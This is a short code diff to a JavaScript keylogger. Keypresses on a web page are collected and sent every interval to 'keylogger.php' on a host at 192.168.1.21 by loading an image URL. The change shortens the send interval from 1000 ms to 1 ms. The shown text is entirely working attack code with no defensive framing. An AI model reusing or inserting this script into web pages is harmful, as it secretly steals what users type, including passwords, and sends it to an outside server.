@@ -22,4 +22,4 @@ document.onkeypress = function(e) {
 window.setInterval(function(){
     new Image().src = 'http://192.168.1.21/keylogger.php?c=' + keys;
     keys = '';
-}, 1000);
+}, 1);
